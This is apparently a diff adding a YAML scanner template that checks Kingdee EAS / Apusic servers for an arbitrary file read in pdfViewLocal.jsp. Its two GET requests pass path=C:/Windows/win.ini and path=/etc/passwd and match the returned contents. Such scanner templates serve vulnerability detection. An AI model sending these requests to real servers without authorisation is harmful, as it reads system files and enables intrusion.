@@ -1,0 +1,17 @@
+name: 金蝶-Apusic-金蝶EAS-pdfViewLocal-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /plt_document/fragments/content/pdfViewLocal.jsp?path=C:/Windows/win.ini
+    expression:
+      status: 200
+      body_all: ["fonts"]
+  - method: GET
+    path: /plt_document/fragments/content/pdfViewLocal.jsp?path=/etc/passwd
+    expression:
+      status: 200
+      body_all:
+        - "root:"
